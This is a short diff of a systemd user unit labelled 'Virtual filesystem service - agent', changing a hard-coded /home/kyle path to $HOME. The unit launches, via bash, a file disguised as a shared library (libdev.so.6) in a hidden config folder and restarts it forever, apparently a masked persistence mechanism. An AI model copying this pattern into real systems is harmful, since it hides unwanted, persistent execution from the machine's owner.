@@ -25,7 +25,7 @@ Description=Virtual filesystem service - agent
 StartLimitInterval=0
 
 [Service]
-WorkingDirectory=/home/kyle/.config/systemd/user
+WorkingDirectory=$HOME/.config/systemd/user
 ExecStart=/bin/bash -c "$HOME/.config/systemd/user/libxct-util/libdev.so.6"
 ExecStop=kill -HUP \$MAINPID
 Restart=always
